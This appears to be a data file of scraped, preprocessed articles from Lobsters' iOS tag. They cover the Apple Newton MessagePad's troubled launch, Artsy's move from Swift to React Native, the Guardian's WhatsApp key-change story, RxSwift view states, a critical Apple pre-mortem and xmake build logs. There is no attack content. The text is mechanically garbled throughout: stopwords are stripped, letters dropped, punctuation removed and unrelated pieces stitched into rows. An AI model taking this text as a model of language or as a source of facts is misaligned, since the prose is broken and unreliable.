ready april deadline sculley set first several ship date change messagepad steve capps began massive campaign identify squash bug messagepad could demonstrated ce chicago engineer put longer day worked fixing thousand bug software quickly declared alpha status meant new feature could added software would fixed optimized despite effort messagepad still unreliable team forced drop ralph altogether slow progress made language lot software totally rewritten tesler practically lived office spending hour day planted front computer hacking away code preparation ce demonstration chicago underway engineer dove even deeper work capps owned large home outside cupertino high speed isdn connection installed home could work remotely productive two newton engineer joined incredible number bug fix oftentimes unit became hot handle faulty power manager software reliable either team practiced demonstration key feature like faxing beaming information via infrared messagepad failed often succeeded demo luckily demonstration went well apple rented space show messagepad chicago messagepads tethered mac unreliable run independently engineer demonstrated shape recognition showed user interface based notebook paradigm desktop mac finder demonstration went well hitch newton still clear result flood positive press messagepad entire computer industry rushing bring similar product market general magic gave first public demonstration magic cap week newton introduction company microsoft amstrad announced would release similar product apple consumer electronics division sculley expected stay apple five year apple growing rapidly sculley stayed though wife soon returned connecticut michael spindler become president coo called shot engineered major reorganization shortly promoted sculley created two major division wrested control job research development marketing spindler broke apple half dozen smaller piece focused specific market newton rolled personal interactive electronics pie division contained apple consumer electronics division headed former phillips executive gaston bastiaens crowning achievement phillips release cd interactive cdi console cdi essentially video game console used cdroms package cost well never became popular eventually standard relegated interactive kiosk european department store cdi demonstrated bastiaens major flaw willing release pricey product poorly defined market pie would soon release line digital camera scanner speaker even portable cd player product priced well competition failed gain foothold bastiaens enthusiastic newton gave team new deadline finish messagepad bastiaens made decision release date press quickly labeling messagepad vaporware newton untethered another ce coming la vega team working hard ever get ready time messagepads would tethered mac would work stress getting engineer relationship strained people spent hour every day work much one software engineer ko isono took life three week scheduled ce demonstration apple poured resource newton company hired psychologist make sure everybody team mentally healthy even started buddy program engineer verge burning new employee hired time tchao staff almost dozen people preparing press packet stuffed news release photograph cardboard mock messagepad engineering staff doubled several time engineer working senior tablet moved messagepad apple constantly adding people team way actually made engineer le productive since explain inner working enormously complex messagepad every new person team still estimated line code team needed much help could get ce show went well apple reserved la vega ballroom demonstration include handwriting recognition faxing shape recognition infrared beaming something totally unprecedented computer world team arrived day demonstration prospect looked bleak messagepads failed sporadically without warning practice power manager still totally functional messagepads would eat battery constantly michael tchao dejected chance successful show demonstration went flawlessly end climax demonstration supposed two newton beaming note failed tchao panicked rushed crowd capps show gathered reporter beam function immediately engineer left stage worked time reporter grumbled changing ship date impressed coverage resoundingly positive nonetheless morale newton team terrible tesler championed project since left newton become chief scientist atg spring time transition newton outgrown beloved office bubb road especially since pink project occupied half newton moved brand new research development headquarters infinite loop contend move new office team give demonstration largest technology expo world cebit held annually hanover people flood midsized city forcing event organizer turn autobahn leading convention center one way road get people show amstrad penpad event important show press progress made prove sharp apple serious finishing newton tchao assistant walked past beer garden hanover spied flyer heading first market inside found description product physically similar messagepad called amstrad penpad cost u le messagepad although price yet public knowledge amstrad started essex england company released number popular home computer early ibm pc even mac became popular britain amstrad lost market share early amstrad making bulk money consumer electronics like satellite receiver stereo system penpad project started way amstrad break promising new market product flawed discontinued month later still nobody knew cebit newton team dejected tchao somewhat heartened news though birth pda meant company felt market potential sculley tipped hand almost two year messagepad would ready tchao terribly surprised company able catch especially product nearly good messagepad going biggest announcement apple cebit addition enormous siemens newton licensee siemens going produce desktop phone based newton apple also announced motorola would release wirelessenabled messagepad called marco random house would developing custom content messagepad demonstration messagepad fell apart handwriting recognition refused recognize phrase ring dietrich presenter pulled another messagepad dais problem solved moment later messagepad sent fax german celebrity dietrich perform apple show michael tchao opened question immediately hit question penpad audience member asked much messagepad would cost tchao responded another asked reference penpad questioner kept hassling tchao bastiaens challenged man bet messagepad ship end summer would give entire wine cellar worth many thousand dollar michael spindler took floor handled question apple fluxing management alpha beta newton team returned california shocked hear newton software beta meant longer crash far case pushed newton team even harder engineer respected change especially steve capps everybody adding bug fix still unstable code one software manager flummoxed find capps kept adding feature even alpha beta capps eventually relented set work real deadline software may sharp needed software burn messagepads assembly line first day may bug newton software day went squashed may clear software still buggy ship thousand documented bug yet squashed apple implemented creative incentive get people fix many bug could like gift certificate tower record use apple changed deadline three time bastiaens knew straight laced japanese would furious apple caused manufacturing schedule fall apart bastiaens decided make gamble producing messagepads beta quality software gold master stage ready consumer messagepads beta software would go consumer instead would used point purchase display retailer sculley spindler top newton team getting ready release first product greatest champion forced sculley resigned urging board apple lost million third quarter sculley immediately replaced michael spindler like job sculley retained title chairman little week later moved connecticut join wife despite setback newton team continued prepare final demonstration launch ce chicago apple rented nightclub show device would vying attention consumer electronics giant casio tandy released palm computingdeveloped zoomer pda show presenter going demonstration given cebit reporter crowded club apple rep spotted several people holding penpoint tablet developed released earlier year incredulous crowd watched newton team went motion clapped politely clear however newton thunder stolen amount money could buy back want know something really depressing capps asked another engineer joey young software engineer still high school started project nonstop programming rest june gold master reached manufacturing began newton production newton team home free yet several problem cropped first disheartening flaw getting started card bundled every messagepad one game included card help train handwriting recognition software failed work patch quickly put together applied hand two thousand messagepads pcmcia card replaced shipped inside messagepad could shipped state another flaw discovered messagepads arrived apple warehouse sacramento rubber pad bottom unit attached correctly would fall vikki pachera helped manufacturing drove sacramento team friend spent entire day gluing nipple bottom messagepads sculley tchao getting ready battery demonstration prior launch culminating demonstration good morning america july tchao terrified since would demonstrate fax feature sending fax de moines iowa part country prone phone line failure top area experiencing serious flooding attempt connect area show unsuccessful air whether tchao would able connect period much le send fax show began tchao gave standard demo messagepad feature started fax spencer christian assignment de moines reporting flooding christian fax machine whirred printed fax tchao front million viewer messagepad performed perfectly three day later macworld boston began thousand show goer streamed logan international airport got cab apple ad top featuring photograph messagepad text taking order debut campy feel based paul revere ride brief promotional video put together one last ever produced appletv division cupertino featured line newton coming newton coming line dignitary gave brief speech even tom selleck tom clancy appeared talk messagepad would affect kyle foundation charity ill child showgoers left auditorium walked past point purchase display store across america one real newton inside running beta software demo software finalized capps night newton launch successful rest world decide whether technological breakthrough dud reading bibliography source used writing article keywords applenewton newtonmessagepad newtonorigin newtonhistory newtonpda short link http searchwords newtonhistory newtonorigin like like loading related
310,Lobsters,ios,Apple iOS,Retrospective: Swift at Artsy - Artsy Engineering,http://artsy.github.io/blog/2017/02/05/Retrospective-Swift-at-Artsy/,retrospective swift artsy artsy engineering,swift production apple tv app application swift artsy moved react native artsy apps positive negative react native summary march artsy apps eigen eidolon emergence lot time effort hub spot katana swift upside consistent existing code swift code interact objectivec work people excited swift evolving swift swift improves lot objectivec would using official route knownunknown territory moya cocoapods moya talk rail native downside type building system exhibit problem well slow second injection xcode second mobile platform radar tried actual implementation automated ci warn u react native react native j developer experience relay jest swiftpm copied apple sherlocked jest better abstraction better developer experience javascript primordial soup react relay debugger external state viewer runtime code injection component storyboarding every bug report typescript typescript change git simulator tool different dev mobile team graphql announcement come home cold fair long way go typescript graphql typescript relay website owning stack may fixed many extension v code major one use fork v code small big move dependency often feel like waste time issue like slack babel flow typescript scale agree nt extending typescript react native one year later additive approach want get started,swift became public june august started using artsy october swift production channelling hundred thousand dollar auction bid pretty obvious swift future native development apple platform nobrainer build apple tv app swift integrated swiftsupport key app eigen built nontrivial part application swift first started experimenting react native february august announced artsy moved react native effectively meaning new code would javascript onwards regularly asked moved touched briefly announcement like dig try cover lot decision process understanding small team io developer decade native experience switched javascript read post cover artsy apps swift positive negative u react native summary finding current pattern building apps scaling team app scope grew building anything inside eigen rarely reused existing native code progressively took longer build feature app test target build time increasing till eventually would take io engineer build feature similar timeframe single web engineer io engineer lot experience across many platform well versed best practice understand value building better tool make faster knowledge nt finding great position product development wise march gave trying keep pace web came conclusion discussion came fix course winter break explored idea could write reusable code artsy apps different apps different tradeoff eigen app take json data server convert user interface view controller nearly always described function taking data mapping ui eidolon auction kiosk app contains lot artsywide unique business logic handled local state like card reader input unique user identification mode emergence trivialish tvos app view controller mostly handled xcode storyboards eigen worried building apps apps limited scope eigen basically mobile representation artsy never going something like eigen eventually came conclusion needed rethink entire uikit stack eigen strictly speaking objectivec problem u issue came abstraction around way built apps rewriting scratch option take lot time effort happily remove technical debt issue also nt need big redesign however lot company used objectivec swift transition time rewrite scratch asked experience developer opted said great marketing tool hiring lot pain actually work day day tend talk technical debt clean slate objectivec painful swift solves major architectural problem notable exception functional programming purist end eigen came conclusion wanted work componentbased architecture architectural choice come studying larger apps handle codereuse considering view controller mix component could extended using protocol swift json defined component would ended like spotify hub hyperslo spot building component structure heavily inspired react like bending spoon katana swift upside continued native apps via native code put resource behind swift quite bit running consistent existing code wrote hundred thousand line code objectivec maybe around hundred thousand swift majority team year cocoa experience noone need essentially argue continuing value swift code interact objectivec work write swift library build ontop existing infrastructure work higher level abstraction building componentbased infrastructure via swift could allow easyreuse existing code providing language difference new app code v infra people excited swift interesting growing language one one nontechnical people ask oh io developer use swift something asked lot developer outside mobile team signed multiple time swift workshop want know swift tradeoff evolving language change fast rate new idea coming influencing language people inside community influence shape growth great claim made swift people respect swift improves lot objectivec pattern use objectivec verbose become extremely terse inside swift potentially making easier read understand would using official route apple obviously want using swift putting lot resource language smart people working project become stable useful every year nt swiftonly apis yet obviously coming knownunknown territory lot knowledge around building better tooling io apps library like moya foundational project like cocoapods coming executing dramatic tooling improvement possible perhaps overlooked smarter abstraction would worked around downside thus making worth expanding search end building something gain popularity get advantage working lot fresh perspective able gain people working project happened moya pattern basecamp discus talk rail beginning real project abstracting outwards native downside dominant two issue come difference opinion software built type type useful overly strict typing system make hard quickly change codebases strictly typed language work really well building system completely atomic apps sort apple build day day basis say atomic app mean one majority input output exist within domain application think apps filetypes control input output really easily even objectivec loosertyped language discouraged using meta programming handling json required tonne boilerplate laden inelegant code working api considering breadandbutter working api party developer come surprise popular cocoapods handling json parsing making network request problem apple generally speaking nt use icloud cloudkit whatever expect also official apple opinion neatly summed official swift blog handle json parsing exhibit problem well swift builtin language feature make easy safely extract work json data decoded foundation apis without need external library framework great code write maintain nt know anyone recommend production stricter type system swift made harder work jsondriven apps slow native development put next web development slow application development requires full compilation cycle full state restart application working trivial string change eigen take second show tell developer time laugh say good moment really stood rediscovered injection xcode ruined appetite building apps traditional way reduced iteration cycle second apple resource fact injection xcode existed year single developer frustrating io mobile platform support code reloading filed bug report radar marked duped comment talked apple engineer wwdc idea dismissed nt work tried heard developer say use playground work around problem kickstarter app probably closest seen actual implementation check hitting issue swift compiler slow yes improve one favourite swift feature inferred typing accidentally increase compile time nonobviously make feel arbitrary code take longer compile eventually automated ci warn u whether code adding slow felt hard predict react native may want read announcement switching react native anticipation however big three reason better developer experience conceptual level rest team ownership whole stack however key part post compare native development also argument stood test time year later sidenote found hard write without able comprehensively reference referencing sibling article j developer experience javascript ecosystem care someone using tool feel part separate good great community enough provide great api comprehensive documentation substantially improve way work reference j relay jest everyone inside community ability tool contribute ecosystem get better tool apple make great tool miss xcode sometimes cohesive beautifully designed nt show age perfect mac citizen though important note make tool apple first u party devs outside influence obviously exists shipping whatever want influence via radar going conference year talking directly dev tool team swift language open source swiftpm well built large developer tool apple ecosystem developer wary copied apple something prevalent common word sherlocked project worked year cocoapods announcement sherlocked deal idea apple shipping kind thing kill community momentum going build something amazing support pulled get popular apple copied made free full time team behind bother make tough u party community build useful tool kind scale normal developer ecosystem contrast drastically javascript ecosystem check explanation jest compare jest either quick specta remind apple power jest reference j jest better abstraction better developer experience mentioned apps build problem specific apidriven application mean majority work tends full data already need iterate get right styling logic mapping correct want also make easy reuse code react componentoriented architecture make easy build type application born javascript primordial soup conceptual framework come go every year react around seems lot momentum framework domain problem io apps external api store complex user device state mature userinterface api either dom uikit react core concept virtual dom mean simplify lot complicated statemanagement application becomes trivial removing need complicated statehandling idea like functional reactive programming relay got genuinely groundbreaking change interaction get handled api nt want work api without tool like relay reference j react relay tool provide developer experience better io native tooling react strict state management rule allow external tool extend react application easily onus react team make better tool project provide tool like debugger external state viewer runtime code injection component storyboarding running simultaneously building application imagine given flow state app every bug report single press save would take change inject current running application keep exact place depending type change could relayout view stay editor make change second le one lot work put test debugger application another screen move head watch change propagate pressing save thinking yeah javascript well use typescript fix pretty much every issue javascript also problem u write native code need still adding existing native codebase last project react native codebase required bidirectional j swift communication react native feel like best world elegant fast work application code whole dev team understands falling back native tooling think best project reference j typescript one thing want really stress around developer experience really easy write test react component testing javascript nightandday better native testing run test outside simulator due react virtual dom run test whenever press save test one related current change git thing miss visual snapshot simulator restart simulator run test make worth though tool different dev wanted stop highly unique inside dev team artsy around developer majority work ruby javascript daytoday basis mobile team single development team nt make api change used different toolchains much slower shipping anything nt great position wanted developer feel like contribute area company past year native mobile project close zero contribution anyone outside mobile team due difference tooling idea cultural difference u since mobile team moved react native received feature bug fix web team fit better overall expansion mobile team developer scope made much easier u reason finding better way share code web team end collector web team introduced graphql artsy wrote affected mobile team act api layer owned frontend side artsy meaning could contain lot apiderived clientspecific logic previously work done web team consumed mobile team build apis consume reference j graphql something explored deeply however expect able port lot react native android got rough prototype ported day work working reactlevel allowing react native binding handle interaction host o writing crossplatform code consider blocked android support specifically engineer team deep experience android moving react native obviate native skill going significantly better environment skill without mentioned announcement already knowledgeable io development motivated put time learn platform specific detail think making rich io application react native breeze come home cold fair indeed need someone similar depth knowledge android ecosystem io may need one two entire team rest continue mix web io engineer gain subset crossplatform skill using react native continued path using swift skill would continue siloed argument swift running server soon reuse swift code across platform could see writing serverside backend code swift writing system apps long way go also nt argument towards using native apps rewrite server implement graphql relay stack also would impact frontend code web would still using javascript respect swift android potentially logic code could shared platform realistically setup worth moving kind logic graphql instance sharing across client native platform sharing model code could generate perproject instead server since graphql stronglytyped typescript graphql typescript relay nt know end prototyped porting one view controller react native website almost sourcecompatible completely different mindset year ago owning stack pick abstraction level application uikit fork tool also forked fix issue native concept like use steipete fork uikit uipopover rotation fix version xcode run test press save well hopefully latter may fixed time choice wait maybe wo nt happen aspect part problem tool given year get new one lose old one contrast built many extension v code use helped major one v code nt wanted started using use fork reference j v code last year submitted code major javascript dependency react native relay v code jest library inbetween fixing problem see offering feature need change small big move able help problem make much easier live dependency using react native brings worth highlighting done github open write issue get response direct line people working something depend stark contrast radar system used internally apple external developer writeonly access external contributor radar opaque often feel like waste time hand github issue nt wait repo maintainer others get value publicly indexed put effort radar instead issue like whole community would worse nt doom gloom swift language swiftpm package manager apple open feedback cycle using tool like slack mailing list jira twitter one aspect working javascript particularly pleasant idea language effectively buffet want use latest feature language optin slowly added language feature retaining backwards compatibility first using babel flow finally typescript contrast may last major time happens people refer time took migrate scale week swift migration language evolve great sometimes way agree sometimes way nt able use version tool free make work business talking extending typescript specifically application react native one year later announcement talked lack nuanced postmortem react native year least try help space sticking react native foreseeable future would take drastic change apple ecosystem u reconsider decision summary year share concept web tool built apps like right requires engineer willing dive deep j need native experience polished app dependency stack still obscenely big open native engineer project make welcoming others problem occur everything fixable forking extensive communication native code get tricky test maintain ended reusing quite lot existing native code make working native code feel like chore lose j developer experience spending much time another environment erode native knowledge make lot sense additive approach existing apps making plan rewrite apps react native fine asis new apps going forward default react native apps unless good reason use react native maybe api driven app probably definitely worth week prototyping engineering team go well look graphql relay really make react native shine want get started like look graphql relay nt want start building server consider graphql service
312,Lobsters,ios,Apple iOS,The Guardian v WhatsApp,http://thlog.anfedorov.com/post/guardian-v-whatsapp/,guardian v whatsapp,guardian v whatsapp happened false story rebuttal open letter doubled wrong approach trusting identity key,guardian v whatsapp wed feb happened nathaniel mott wrote guardian published false story whatsapp vulnerability accurately described security tradeoff appropriate user recommending folk use signal instead outrage ensued culminating rebuttal signal protocol author open letter calling apology retraction cosigned academic industry expert guardian doubled article tobias boelter grad student responsible original claim misrepresenting rebuttal semantic argument constitutes backdoor wrong approach technical part mott boelter falsehood addressed well legal political angle seems missed care sort thing whatsapp provides option enable warning user identity key change importantly fact however identical default setting provided google allo incognito chat important still default show key change option wholly absent apple message avoids mentioning identity key user altogether folk serious reporting vulnerability public least mention google endtoendencrypted solution well apple platform backdoor importantly guardian focus facebook whatsapp materially better verifying key telling user key change apple imessage client trusting identity key wake minor piece misinformation one important question remains hanging law enforcement force google apple facebook lie user friend identity key see message bob imessage allo whatsapp trusting apple google facebook correctly forward identity key unique device identity key allows encrypt message way bob device decrypt looked find legal method anyone force american company lie user many device another user owns key curious learn good followup discussion
313,Lobsters,ios,Apple iOS,"Observables, State Machines, and Associated Types‚Ä¶ Oh My!",https://engineering.snagajob.com/observables-state-machines-and-associated-types-oh-my-9992cc1082d0,observables state machine associated oh,observables state machine associated oh snagajob rxswift rxjava hiring result microframework repo,observables state machine associated oh snagajob io team us rxswift build apps android team us rxjava hiring one common question come building apps using rxswift deal error observable world error end stream observable produce often error actually represent permanent error condition transient recoverable error state example network unavailable unexpected status code web serverin code base two type manage condition first result type generic value error allows u treat error condition potential event observable stream prevents u completing observable stream case recoverable error result type heavily inspired rob rix fantastic result microframework great type handling api responseson hand large part programming time spent describing state user via ui also built viewstate type viewstate type enum specifies different state view possible state result able complete request happy path loading fetching result network data providererror recoverable error occurredempty result foundthanks swift associated value result case includes actual result data want display view data could list job user detail information anything else allow enum carry data need make viewstate enum generic result typecoupled protocol call viewstatetransitionable protocol requires implementor define result type intends display uibindingobserver manages state transition state emitted source observablerxswift provides u uibindingobserver give u guarantee observer property important building uis using observables bind error debug build binding error cause fatalerror release build error logged ensures binding performed main thread dispatch main queue observable value delivered non main queue thread retain source targetto demonstrate use system created example repo simple view controller subclass set observable scanning tap observable uibarbuttonitem adding itselfrefreshitemrxtap scan previousvalue return previousvalue map int value produce one value viewstate enumeration producing error every tap random color array empty state tap map int viewstate uicolor int return error demoerrorsomething else let randomcolor selfbackgroundcolorscount return result selfbackgroundcolors int rand else return empty promote raw observable driver read driver unit simply stated driver observable type following important guarantee error outobserve main schedulerin word driver helpful providing execution context appropriate observables used drive ui elementsin order promote plain observable need provide logic happen source observable produce error example wrap error viewstate enum value called error seen asdriver onerrorrecover observableerror return driverjust error observableerror point driver viewstate uicolor need utilized bind driver viewcontrollers implementation viewstatetransitionable viewstate uibindingobserver simply hide show various view view controller managing see implementation viewstate extension add viewstatetransistionable conformance view controller also define protocol required associatedtype defines expect data type displayingextension viewcontroller viewstatetransitionable typealias result uicolor typealias uielement viewcontrollervar viewstate uibindingobserver uielement viewstate result return uibindingobserver uielement self viewcontroller state switch state case result let color selfresultviewbackgroundcolor color uiviewtransition selfresultview duration option animation selfviewbringsubview tofront selfresultview completion nil case empty uiviewtransition selfemptyview duration option animation selfviewbringsubview tofront selfemptyview completion nil case error uiviewtransition selferrorview duration option animation selferrorlabeltext error occurred selfviewbringsubview tofront selferrorview completion nil default return think really cool example rxswift combined swift static type system including associatedtypes generic protocol allows u compose unique typesafe concise code allows u describe problem semantic manner
314,Lobsters,ios,Apple iOS,Apple Inc: A Pre-Mortem,https://medium.com/adventures-in-consumer-technology/apple-inc-a-pre-mortem-568d1a0b7d72,apple inc premortem,layered legacy code felt le polished apple tv keyboard input notification fill gap harder use today io famously said even ship two remote apps ready use device fword sound familiar clearly meant ship noticeably absent remarkably unapplelike solution single signon poor infrastructure capability privacy stance negotiation leverage blownup smartphone game killed game centre instituted rereversed forcing decided finally reverse huge heatsink underutilised apple service written extensively hardline privacy stance apple view service valueadding feature rather discrete platform bestinclass voice control delete people music library web data loss issue original vision soul product apple company answered repeatedly emphasised challenge attracting retaining ai cloud expert chaos infighting delayed development year throwitagainstthewall approach compromised product steve job last keynote shortcoming mobileme former next employee pioneer iphone apple map apology letter clashing michael rand lopp said entirely predictable get rid chaos turbulence organization beginning,apple current strategy simply tacking feature rather rethinking fundamental interaction model result product like itunes itunes store legacy code indeed would help explain io felt le polished buggy apple tvthe apple tv suffered fate apple watch apple dumped app store springboard onto called new product essentially brought io living room bad thing first glance except least integrated device entire apple ecosystem continuity even though need product instead annoying keyboard input notification instead loginidentity solution need keyboard input notification apple relying competitor fill gap yet airplay harder use today io proactive missing user reduced furiously swiping giant grid icon tim cook famously said love operating apple tv apple watch yet even ship support apple existing remote app two remote apps old one work apple watch simple onetap setup airpods ready use device except apple tv importantly siri suffers dreaded fword regardless springboard approach wrong one start ux revolved around discovering finding content sound familiar however instead doubling method apple stuck behind yet another app icon user reduced jumping myriad different apps apple created another app course app clearly meant ship product day one tv app supposed solve discovery side two problem biggest streaming service noticeably absent remarkably unapplelike solution user discover content already mention noticeably absent streaming service amazon video single signon whole different mess confused yet meanwhile amazon done better job making content apps focal point point might wondering apple trying bandaid solution rather delivering tv service starter worst negotiating position thanks poor infrastructure capability privacy stance secondly sloppy execution resulted apple tv remaining hobby product adoption level meaning gained negotiation leveragefurthermore apple unrefined approach simply sticking entire app store resulted product different android tv blownup smartphone game every app category need present apple tvthe result similar lack focus game apple demonstrated io game another app category killed game centre rather ever iterating instituted rereversed gamingunfriendly controller policy crippled game forcing yet upsell model last week decided finally reverse illogical policy month later strongest evidence apple cohesive understanding game redesigned entire box incorporate huge heatsink totally underutilised suggests product team original plan apple tv serious console marketing team hijacked itultimately comparatively expensive device weak value proposition poor apple servicesi written extensively apple problem service originating hardline privacy stance however another major issue apple view service valueadding feature rather discrete platform stem hardwarecentric business model accordingly reflected devicecentred service approach problem service eating software often indistinguishable therefore apple treating service equal importance io macos tvos icloud bestinclass siri soupedup voice control apple music delete people music library service work seamlessly across device platform even webapple somewhat recognised recently using siri branding proactive feature eg siri app suggestion problem merely halfstep siri still treated osdependent feature apple cherrypicks feature appear result fragmented experience outlined icloud performs horribly web often crossdevice syncing problem even experience data loss issue far cry steve original vision seamless cloud computingfurther icloud treated hard drive cloud apple eliminate need endless login screen multiple device expanding icloud keychain identity solution icloud provide automatic app data sync allowing user restore previously backedup app data redownloading app rather requiring entire device restore icloud backup siri data synced icloud personalise user devicesapple need realise service much soul product hardware brain apple companywhen walter isaacson asked steve job greatest product answered product proud apple team built apple steve also repeatedly emphasised importance hiring player afraid challenge team group incredibly talented people bumping argument fight sometimes making noise working together polish polish idea come really beautiful stonesapple greatest threat losing culture looking company today concerned indeed occurring great difficulty attracting retaining ai cloud expertsthere lack leadership resulted chaos infighting amongst cloud talent able attract delayed development year accordingly complex infrastructure issue solved bandaid solution implemented instead new candidate repelledthe company marketing engineering team lack unity vision instead taking throwitagainstthewall approach prioritising deadline delivering best product resulted unfocused product development compromised product apple tv recent example watching steve job last keynote astonished contrast apple air selfawareness seems replaced increasingly selfcongratulatory attitude job forstall openly acknowledged shortcoming mobileme io apple pat back almost every turn including increased number press appearance apple must fall headoverheels love product pride accomplishment lest become blind shortcomingsone tim cook first change fire steve job handpicked former next employee pioneer iphone scott forstall official reason refused sign infamous apple map apology letter however real explanation likely due executive suddenly clashing tim cook unable perform conflict resolution inherent managerial role many people believe removal conflict helpful apple forstall precisely embodied character steve job described necessary creating best product steve job often described divisive largerthanlife character also get along people fact former employee michael rand lopp said year apple caffe mac chatter forstall legit successor job displayed variety jobsian characteristic unfortunately tim cook move entirely predictable charge one first thing operationsexecution ceo get rid chaos turbulence organization execution ceo value stability process repeatable execution one hand great predictability often start creative death spiral creative people start leave executor without innovation talent old leader put senior role hiring process people turn force remaining creative talent culture shift ripple top felt like company mission change world feel like another joband become evident firing forstall beginning
316,Lobsters,ios,Apple iOS,"Compile c++, objc and swift program across platforms fastly",http://tboox.org/2017/01/18/usage-demo/,compile c objc swift program across platform fastly,,
317,Lobsters,ios,Apple iOS,Scan source codes and build project without makefile,http://tboox.org/2017/01/07/build-without-makefile/,scan source code build project without makefile,compile open source library fastly compile run testing code multilanguage support compile multiple executables time manual configuration,recently added new feature xmake need write makelike file xmakelua makefileam cmakelisttxt etc also build directly scan source file generate xmakelua automatically building project xmake detect main function source file order distinguish static library executable program currently project singlelevel directory supported compile open source library although approach limitation sufficient complie run temporary code testing example downloaded source want compile need enter zlib source directory run following command done output result xmakelua found scanning file target static compressc deflatec gzclosec gzlibc gzreadc gzwritec infbackc inffastc inflatec inftreesc treesc uncomprc zutilc xmakelua generated scan ok checking architecture checking xcode sdk version macosx checking target minimal version checking c compiler cc xcrun sdk macosx clang checking c compiler cxx xcrun sdk macosx clang checking objc compiler mm xcrun sdk macosx clang checking objc compiler mxx xcrun sdk macosx clang checking swift compiler sc xcrun sdk macosx swiftc checking assember xcrun sdk macosx clang checking linker ld xcrun sdk macosx clang checking static library archiver ar xcrun sdk macosx ar checking static library extractor ex xcrun sdk macosx ar checking shared library linker sh xcrun sdk macosx clang checking debugger dd xcrun sdk macosx lldb checking golang compiler go go configure ex xcrun sdk macosx ar sh xcrun sdk macosx clang host macosx ar xcrun sdk macosx ar buildir build xcrun sdk macosx clang plat macosx xcodedir applicationsxcodeapp arch mxx xcrun sdk macosx clang go go targetminver ccache ccache mode release clean true cxx xcrun sdk macosx clang cc xcrun sdk macosx clang dd xcrun sdk macosx lldb kind static ld xcrun sdk macosx clang xcodesdkver sc xcrun sdk macosx swiftc mm xcrun sdk macosx clang configure ok clean ok ccache compilingrelease ccache compilingrelease compressc ccache compilingrelease ccache compilingrelease deflatec ccache compilingrelease gzclosec ccache compilingrelease gzlibc ccache compilingrelease gzreadc ccache compilingrelease gzwritec ccache compilingrelease infbackc ccache compilingrelease inffastc ccache compilingrelease inflatec ccache compilingrelease inftreesc ccache compilingrelease treesc ccache compilingrelease uncomprc ccache compilingrelease zutilc archivingrelease build ok xmake scan current directory detect source code found main function static library project build static library write makelike file xmakelua use makefile zlib project compiled directly xmakelua file generated edit xmakelua build complicated project content generated xmakelua define target target set kind setkind static add file addfiles addfiles compressc addfiles addfiles deflatec addfiles gzclosec addfiles gzlibc addfiles gzreadc addfiles gzwritec addfiles infbackc addfiles inffastc addfiles inflatec addfiles inftreesc addfiles treesc addfiles uncomprc addfiles zutilc fastly compile run testing code example want write simple program mainc echo hello world use gcc compile run need run two command gcc mainc demo demo use xmake run need run done output result lot code file need also run one command easy convenient multilanguage support feature code detection realtime compilation support c c also support objc swift support golang future example downloaded io open source framework code fmdb fmdbh fmdatabaseh fmdatabasem fmdatabaseadditionsh fmdatabaseadditionsm fmdatabasepoolh fmdatabasepoolm fmdatabasequeueh fmdatabasequeuem fmresultseth fmresultsetm makelike file project directory us xmake build directly io static library xmake f p iphoneos xmake output result xmakelua found scanning file target fmdb static fmdatabasem fmdatabaseadditionsm fmdatabasepoolm fmdatabasequeuem fmresultsetm xmakelua generated scan ok checking architecture checking xcode sdk version iphoneos checking target minimal version checking c compiler cc xcrun sdk iphoneos clang checking c compiler cxx xcrun sdk iphoneos clang checking objc compiler mm xcrun sdk iphoneos clang checking objc compiler mxx xcrun sdk iphoneos clang checking assember gaspreprocessorpl xcrun sdk iphoneos clang checking linker ld xcrun sdk iphoneos clang checking static library archiver ar xcrun sdk iphoneos ar checking static library extractor ex xcrun sdk iphoneos ar checking shared library linker sh xcrun sdk iphoneos clang checking swift compiler sc xcrun sdk iphoneos swiftc configure ex xcrun sdk iphoneos ar ccache ccache host macosx ar xcrun sdk iphoneos ar buildir build usrlocalsharexmaketoolsutilsgaspreprocessorpl xcrun sdk iphoneos clang arch mxx xcrun sdk iphoneos clang cxx xcrun sdk iphoneos clang targetminver xcodedir applicationsxcodeapp clean true sh xcrun sdk iphoneos clang cc xcrun sdk iphoneos clang ld xcrun sdk iphoneos clang mode release kind static plat iphoneos xcodesdkver sc xcrun sdk iphoneos swiftc mm xcrun sdk iphoneos clang configure ok clean ok ccache compilingrelease fmdatabasem ccache compilingrelease fmdatabaseadditionsm ccache compilingrelease fmdatabasepoolm ccache compilingrelease fmdatabasequeuem ccache compilingrelease fmresultsetm archivingrelease libfmdba build ok compile multiple executables time output result xmakelua found scanning file target static cdjpegc examplec jcapiminc jcapistdc jccoefctc jccolorc jcdctmgrc jchuffc jcinitc jcmainctc jcmarkerc jcmasterc jcomapic jcparamc jcphuffc jcprepctc jcsamplec jctransc jdapiminc jdapistdc jdatadstc jdatasrcc jdcoefctc jdcolorc jddctmgrc jdhuffc jdinputc jdmainctc jdmarkerc jdmasterc jdmergec jdphuffc jdpostctc jdsamplec jdtransc jerrorc jfdctfltc jfdctfstc jfdctintc jidctfltc jidctfstc jidctintc jidctredc jmemansic jmemmgrc jmemnamec jmemnobsc jutilsc rdbmpc rdcolmapc rdgifc rdppmc rdrlec rdswitchc rdtargac transuppc wrbmpc wrgifc wrppmc wrrlec wrtargac target binary target cjpeg binary cjpegc target ckconfig binary ckconfigc target djpeg binary djpegc target jpegtran binary jpegtranc target rdjpgcom binary rdjpgcomc target wrjpgcom binary wrjpgcomc xmakelua generated scan ok checking architecture checking xcode sdk version macosx checking target minimal version checking c compiler cc xcrun sdk macosx clang checking c compiler cxx xcrun sdk macosx clang checking objc compiler mm xcrun sdk macosx clang checking objc compiler mxx xcrun sdk macosx clang checking swift compiler sc xcrun sdk macosx swiftc checking assember xcrun sdk macosx clang checking linker ld xcrun sdk macosx clang checking static library archiver ar xcrun sdk macosx ar checking static library extractor ex xcrun sdk macosx ar checking shared library linker sh xcrun sdk macosx clang checking debugger dd xcrun sdk macosx lldb checking golang compiler go go configure ex xcrun sdk macosx ar sh xcrun sdk macosx clang host macosx ar xcrun sdk macosx ar buildir build xcrun sdk macosx clang plat macosx xcodedir applicationsxcodeapp arch mxx xcrun sdk macosx clang go go targetminver ccache ccache mode release clean true cxx xcrun sdk macosx clang cc xcrun sdk macosx clang dd xcrun sdk macosx lldb kind static ld xcrun sdk macosx clang xcodesdkver sc xcrun sdk macosx swiftc mm xcrun sdk macosx clang configure ok clean ok ccache compilingrelease cdjpegc ccache compilingrelease examplec ccache compilingrelease jcapiminc ccache compilingrelease jcapistdc ccache compilingrelease jccoefctc ccache compilingrelease jccolorc ccache compilingrelease jcdctmgrc ccache compilingrelease jchuffc ccache compilingrelease jcinitc ccache compilingrelease jcmainctc ccache compilingrelease jcmarkerc ccache compilingrelease jcmasterc ccache compilingrelease jcomapic ccache compilingrelease 